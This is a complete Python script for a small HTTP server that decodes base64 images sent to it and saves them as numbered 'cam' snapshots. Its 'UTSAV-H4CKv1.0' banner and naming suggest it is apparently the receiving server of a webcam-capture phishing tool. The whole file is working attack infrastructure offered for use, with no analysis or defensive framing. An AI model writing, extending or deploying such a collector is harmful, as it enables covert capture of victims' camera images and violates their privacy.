# utsav_server.py
import http.server
import socketserver
import os
from urllib.parse import unquote

PORT = 8080
SAVE_FOLDER = "utsav_data"

if not os.path.exists(SAVE_FOLDER):
    os.mkdir(SAVE_FOLDER)

class UTSAVHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(length)
        filename = os.path.join(SAVE_FOLDER, "cam_" + str(len(os.listdir(SAVE_FOLDER))) + ".png")
        with open(filename, 'wb') as f:
            header, encoded = post_data.split(b',', 1)
            import base64
            f.write(base64.b64decode(encoded))
        print("[+] Saved image:", filename)
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"UTSAV-H4CKv1.0 Server is Running")

with socketserver.TCPServer(("", PORT), UTSAVHandler) as httpd:
    print("[*] Listening on port", PORT)
    httpd.serve_forever()
